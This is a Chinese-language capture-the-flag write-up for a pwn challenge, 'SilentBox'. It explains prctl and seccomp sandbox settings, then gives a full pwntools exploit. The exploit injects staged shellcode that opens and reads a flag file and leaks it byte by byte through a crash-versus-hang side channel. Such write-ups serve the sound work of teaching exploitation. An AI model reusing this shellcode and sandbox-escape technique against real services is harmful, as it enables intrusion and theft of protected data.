---
author: Canary
tag: WriteUp
---

# Brute_Force&Side_Channel_Attack

## 1.SilentBox

### 	a.  Prctl 沙箱简单知识补充

```c
prctl(38,1,0,0,0)
38 - PR_SET_NO_NEW_PRIVS Arg2 = 1;
//经典禁用EXECVE
    
prctl(22, 2LL, &unk_202070);
/* Valid values for seccomp.mode and prctl(PR_SET_SECCOMP, <mode>) */
#define SECCOMP_MODE_DISABLED	0 /* seccomp is not in use. */
#define SECCOMP_MODE_STRICT	1 /* uses hard-coded filter. */ 严格模式 read write exit sigret
# define SECCOMP_MODE_FILTER	2 /* uses user-supplied filter. */ 自定义Rule

prctl(4,0)
 PR_SET_DUMPABLE . 
//有反调试的作用。这个时候本地NOP一下方便后续调试。
    
prctl Ref Website
   https://chromium.googlesource.com/native_client/linux-headers-for-nacl/+/2dc04f8190a54defc0d59e693fa6cff3e8a916a9/include/linux/prctl.h
```

### b.漏洞点  & 利用限制

![disasm]({{ site.url }}/assets/postimg/SilentBox/disasm.png)

### c. Exp

```python
#!/usr/bin/env python3
import datetime
from pwn import*
def pwn(ch,index):
    p = process("chall")
    context.arch ="amd64"
    '''
    # 0x10028 FLAG DIR
    # 0x10800 Open Ptr
    # 0x10810 Store Flag
    '''

    #=====Re Input
    shellcode = 'mov rdi,0\n'
    shellcode += 'mov rsi,0x10100\n'
    shellcode += 'mov rdx,0x200\n'
    shellcode += 'mov eax,0\n'
    shellcode += 'syscall\n'
    shellcode += 'movq r10,0x10100\n'
    shellcode += 'call r10\n'
    #gdb.attach(p,"b* $rebase(0xc94)")
    a = asm(shellcode)
    a = a.ljust(0x28,b'\x90')
    a+= b"/home/canary/pwn/flag\x00"
    p.recvline()
    p.sendline(a)
    #===== Shellcode 1 Running AT 0X10100
    #0x10800 = Open('/home/canary/pwn/flag',0,0)
    shellcode = "mov rdx,0\n"
    shellcode += 'movq rdi,0x10028\n'
    shellcode += "mov rsi,0\n"
    shellcode += "mov eax,2\n"
    shellcode += "syscall\n"
    shellcode += 'mov qword ptr [0x10800],rax\n'
    #read(0x10800,0x10810,0x20)
    shellcode += 'push 3\n'
    shellcode += 'pop rdi\n'
    shellcode += "push 0x10810\n"
    shellcode += 'pop rsi\n'
    shellcode += 'push 0x20\n'
    shellcode += 'pop rdx\n'
    shellcode += "mov rax,0\n"
    shellcode += "syscall\n"
    #read(1,0x10100,0x100)  Re Read In;
    shellcode += "mov rdi,0\n"
    shellcode += "push 0x10200\n"
    shellcode += "pop rsi\n"
    shellcode += "mov rdx,0x100\n"
    shellcode += "mov rax,0\n"
    shellcode += "syscall\n"
    shellcode += 'movq r10,0x10200\n'
    shellcode += 'jmp r10\n'
    b = asm(shellcode)
    p.sendline(b)

    #=======Try Flag   Running at 0x10200
    shellcode = "cmp byte ptr [0x10810+{index}],{char}\n".format(index=index,char=ch)
    # je -> 死循环 jnE -> crash
    shellcode += 'jz $-8'
    c = asm(shellcode)
    p.sendline(c)
    try:
        p.recv(timeout=0.01) # Recv Will Failed After EOF
    except:
        p.close()
        print("Failed..")
        return 0
    else:
        p.close()
        print("Successed")
        return 1
starttime = datetime.datetime.now()
flag = ""
end = 0
for index in range(0x40):
    for char in range(97,126):
        result = pwn(char,index)
        print("Now Trying ..." + chr(char))
        if result:
            flag += chr(char)
            print(flag)
            if chr(char) == "}":
                end = 1
            break
    if end==1:
        break
print("FLAG GET & FINALL ANSWER IS:")
print(flag)
endtime = datetime.datetime.now()
print("共计运行:")
print (endtime - starttime).seconds
```

### d.利用说明

​	比ORW更加极端的情况 禁用了WRITE。不能直接写出，此时只能采用爆破的方式。

​	通过RECV()(判断程序是否崩溃是一个新点。 如果程序挂了RECV会有Excption，合理的利用Try Except Else 可以更方便的帮助我们解决问题。

​	最后还有一些简单的汇编语法问题，只能说多做多练。

